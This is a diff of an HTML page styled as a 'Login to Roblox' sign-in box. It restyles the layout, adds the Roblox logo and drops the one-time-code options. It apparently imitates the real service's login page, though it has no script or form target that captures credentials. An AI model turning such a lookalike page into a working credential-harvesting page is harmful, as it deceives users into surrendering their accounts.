@@ -6,8 +6,9 @@
     <title>Login to Roblox</title>
     <style>
         body {
-            background-color: #0d0d0d;
             font-family: Arial, sans-serif;
+            background-color: #191919;
+            color: white;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -15,67 +16,52 @@
             margin: 0;
         }
         .login-container {
-            background-color: #1a1a1a;
+            background-color: #232323;
             padding: 20px;
-            border-radius: 5px;
-            width: 320px;
+            border-radius: 8px;
             text-align: center;
-            color: white;
+            width: 300px;
         }
-        h2 {
-            margin-bottom: 20px;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
+        .login-container img {
+            width: 100px;
             margin-bottom: 10px;
-            background: #333;
-            border: 1px solid #444;
-            color: white;
-            border-radius: 3px;
         }
-        .login-btn {
+        .login-container input {
             width: 100%;
             padding: 10px;
-            background-color: #222;
-            color: white;
+            margin: 5px 0;
             border: none;
-            cursor: pointer;
-            border-radius: 3px;
-        }
-        .login-btn:hover {
-            background-color: #444;
-        }
-        .option-btn {
-            width: 100%;
-            padding: 10px;
-            margin-top: 10px;
+            border-radius: 5px;
             background-color: #333;
+            color: white;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
             border: none;
+            border-radius: 5px;
+            background-color: #007bff;
             color: white;
             cursor: pointer;
-            border-radius: 3px;
         }
-        .option-btn:hover {
-            background-color: #444;
+        .login-container button:hover {
+            background-color: #0056b3;
         }
-        .forgot-link {
-            display: block;
+        .forgot {
             margin-top: 10px;
-            font-size: 14px;
-            color: #bbb;
+            font-size: 12px;
         }
     </style>
 </head>
 <body>
     <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/Roblox_logo_2022.svg" alt="Roblox Logo">
         <h2>Login to Roblox</h2>
         <input type="text" placeholder="Username/Email/Phone">
         <input type="password" placeholder="Password">
-        <button class="login-btn">Log In</button>
-        <a href="#" class="forgot-link">Forgot Password or Username?</a>
-        <button class="option-btn">Email Me a One-Time Code</button>
-        <button class="option-btn">Use Another Device</button>
+        <button>Log In</button>
+        <p class="forgot">Forgot Password or Username?</p>
     </div>
 </body>
 </html>
